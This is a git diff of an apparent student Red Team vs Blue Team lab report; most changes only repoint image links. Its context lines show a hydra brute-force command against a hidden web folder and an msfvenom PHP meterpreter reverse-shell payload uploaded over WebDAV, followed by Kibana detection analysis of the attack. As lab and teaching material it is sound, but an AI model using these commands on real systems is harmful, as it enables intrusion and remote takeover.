@@ -22,7 +22,7 @@
 
 ### 1. Network Topology
 
-![draw.io](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/NetworkDiagram.jpg)
+![draw.io](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/NetworkDiagram.jpg)
 
 | Hostname | IP Address    | Role on Network |
 |----------|---------------|-----------------|
@@ -58,17 +58,17 @@ I based the assement off of the [2021 OWASP Top 10 Web Application Security Risk
 		
 		- `nmap -sV 192.168.1.105`
   
-![nmap ss](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/1nmap.png)
+![nmap ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/1nmap.png)
 
 		- `dirb 192.168.1.105`
   
-![dirb ss](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/2.dirb.png)
+![dirb ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/2.dirb.png)
 
 		- `hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder` 
   
-![Hydra Input ss](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/3.hydra(input).png)
+![Hydra Input ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/3.hydra(input).png)
 
-![Hydra Output ss](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/4.hydra(output).png)
+![Hydra Output ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/4.hydra(output).png)
 
 #### Exploitation: 2 Cryptographic Failures
 
@@ -84,22 +84,22 @@ I based the assement off of the [2021 OWASP Top 10 Web Application Security Risk
    	
 	   - Prompts of a "secret_folder" with the network location included
   
-![secretfolder prompt ss](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/5.SecretFolderPrompt.png)
+![secretfolder prompt ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/5.SecretFolderPrompt.png)
 
 		- Login screen at the secret folder location.
 			- This shows a potential username that I successfully used in the brute force attack with Hydra.  
   
-![secretfoldernotice](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/6.secretfoldernotice.png)
+![secretfoldernotice](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/6.secretfoldernotice.png)
 
 		- Once inside the secret folder I found a Hashed password and the user credentials to use with it. 
     		- It also contains directions of where to use the credentials and what can be accessed. 
   
-![hashed pass ss](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/7.HashedPass.png)
+![hashed pass ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/7.HashedPass.png)
 
 		- Cracking the hash I found with crackstation
 -  [Crackstation](https://crackstation.net)
   
-![crackstation work ss](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/8.Crackstation.png)
+![crackstation work ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/8.Crackstation.png)
 
 #### Exploitation: 3 Insecure Design
 
@@ -122,37 +122,37 @@ I based the assement off of the [2021 OWASP Top 10 Web Application Security Risk
 
 		- Remote access to the server with the cracked credentials
   
-![WebDAV Login ss](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/9.WebDAV(login).png)
+![WebDAV Login ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/9.WebDAV(login).png)
 
-![WebDAV access ss](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/10WebDav(access).png)
+![WebDAV access ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/10WebDav(access).png)
 
 		- Creating a reverse shell with msfvenom to remotely execute
 
 `msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 >>~/Desktop/shell.php`
   
-![msfvenom reverse shell script creation](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/11.msfVenom.png)
+![msfvenom reverse shell script creation](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/11.msfVenom.png)
 
 		- Click the shell and drag it into the directory.
 
-![upload reverse shell script ss](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/12.UploadShell.png)
+![upload reverse shell script ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/12.UploadShell.png)
 
 		- Set up a remote computer to listen for the shell to be executed
   
-![msfconsole start ss](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/13.msfconsole(start).png)
+![msfconsole start ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/13.msfconsole(start).png)
 
-![msfconsole setup ss](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/14.msfconsolesetup.png)
+![msfconsole setup ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/14.msfconsolesetup.png)
 
 		- Remote execution of the shell with a hacker waiting on the other side by clicking "shell.php" from within the WebDAV directory
   
-![risky click shell ss](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/15.RiskyClickReverseShell.png)
+![risky click shell ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/15.RiskyClickReverseShell.png)
 
 		-Meterpreter session was initiated with that last click
 
-![hackerscomp Meterpreter Connection](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/16.MeterpreterSession.png)
+![hackerscomp Meterpreter Connection](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/16.MeterpreterSession.png)
 
 		- The hacker can easily do anything they want with the server at that point
 
-![progression of the shell ss](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/17.Progressionofshell.png)
+![progression of the shell ss](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/17.Progressionofshell.png)
 
 
 
@@ -169,11 +169,11 @@ I based the assement off of the [2021 OWASP Top 10 Web Application Security Risk
 		
 		`NOT source.port: 80 and NOT source.port:443`
 
-![source port](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/18.SourcePort.png)
+![source port](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/18.SourcePort.png)
 	
 	It appears the vast majority of packets were from the IP address 192.168.1.90 (Kali)
 
-![portscan IP](portscanip.png)
+![portscan IP](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/portscanip.png)
 
 	2.How many packets were sent, and from which IP?
 		3:05: 30,716 packets were received
@@ -186,33 +186,33 @@ I based the assement off of the [2021 OWASP Top 10 Web Application Security Risk
 	4.Kibana SS's depicting the scan
 	
 	Packets involving ports not used for web traffic
-![sourceport](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/19.Sourceport2.png)
+![sourceport](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/19.Sourceport2.png)
 
 
 
 	3:05 source ports excluding standard web traffic (top) 3:05 Destination ports excluding standard web traffic (bottom)
 	
-![305 Ports in use1](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/20.305portsinuse1.png)
+![305 Ports in use1](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/20.305portsinuse1.png)
 
 	A bar graph depicting the destination ports at 3:05
 
-![305 Ports in use2](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/21.305Portsinuse2.png)
+![305 Ports in use2](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/21.305Portsinuse2.png)
 	
 	3:15 source ports excluding standard web traffic (top) 3:15 Destination ports excluding standard web traffic (bottom)
 
-![315 Ports in use1](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/22.315portsinuse1.png)
+![315 Ports in use1](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/22.315portsinuse1.png)
 	
 	A bar graph depicting the destination ports at 3:15
 
-![315 Ports in use2](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/23.315portsinuse2.png)
+![315 Ports in use2](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/23.315portsinuse2.png)
 
 	A bar graph of the destination ports being used during the attack at 3:27
 
-![327 Ports in use1](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/24.327portsinuse1.png)
+![327 Ports in use1](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/24.327portsinuse1.png)
 
 	Total Packets during the attack at 3:27
 
-![327 Ports in use2](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/25.327portsinuse2.png)
+![327 Ports in use2](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/25.327portsinuse2.png)
 
 #### Analysis: Finding the Request for the Hidden Directory
 	1.What time did the request occur?
@@ -225,13 +225,13 @@ I based the assement off of the [2021 OWASP Top 10 Web Application Security Risk
 		- the volume of requests from an individual source in such a short period of time show that this was a brute force attack against the hidden directory by a single attacker
 	5.Kibana SS's depicting request for the Hidden Directory
 
-![countHiddenDirReq](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/26.CountHiddenDir.png)
+![countHiddenDirReq](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/26.CountHiddenDir.png)
 
 	- This shows the volume of requests from a singular IP address for the secret folder
   	
-![TimeHiddenDirReq](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/27.TimeHiddenDirReq.png)
+![TimeHiddenDirReq](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/27.TimeHiddenDirReq.png)
 
-![countandtime](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/28.ContnTimeHiddenDirReq.png)
+![countandtime](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/28.ContnTimeHiddenDirReq.png)
 
 #### Analysis: Uncovering the Brute Force Attack
 	1.How many requests were made in the attack?
@@ -241,9 +241,9 @@ I based the assement off of the [2021 OWASP Top 10 Web Application Security Risk
 	3.Kibana SS's depicting the brute force attack
 		-Connections over time
 
-![bruteforce1(29)](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/29.bruteforce1.png)
+![bruteforce1(29)](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/29.bruteforce1.png)
 
-![bruteforce230](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/30.bruteforce2.png)
+
 #### Analysis: Finding the WebDAV Connection
 	1.How many requests were made to this directory?
 		- 37 were made to the wWebDAV folder
@@ -253,11 +253,11 @@ I based the assement off of the [2021 OWASP Top 10 Web Application Security Risk
 
 	This image shows the connections to the WebDAV directory, and the status codes that were sent.
 
-![WebDav Directory31](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/31.WebDavDirectory%20Requests.png)
+![WebDav Directory31](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/31.WebDavDirectory%20Requests.png)
 
 	This image shows the reverse shell file that was uploaded and utilized.
 
-![requested fileShell.php32](https://github.com/BQcybersec/Skool/blob/main/Red%20Team%20vs%20Blue%20Team/Images/32.WebDAVRequestedFile.png)
+![requested fileShell.php32](https://github.com/BQcybersec/-UofM-VIRT-CYBER-12-2021/blob/main/Project%202%20%20%20RedTeam_vs_BlueTeam/Images/32.WebDAVRequestedFile.png)
 
 
 ### 4. Hardening: Proposed Alarms and Mitigation Strategies
